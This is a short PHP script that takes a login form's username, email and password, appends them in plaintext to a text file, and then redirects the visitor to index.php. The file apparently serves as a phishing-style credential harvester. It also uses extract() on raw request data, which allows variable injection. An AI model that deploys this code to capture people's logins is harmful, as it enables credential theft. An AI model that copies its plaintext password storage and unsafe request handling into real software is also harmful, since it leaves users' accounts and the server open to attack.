<?php
    extract($_REQUEST);
    $file=fopen("login-form.txt","a");

    fwrite($file,"Nume: ");
    fwrite($file, $username ."\n");
    fwrite($file,"Email: ");
    fwrite($file, $email ."\n");
    fwrite($file,"Parola: ");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: index.php");
 ?>
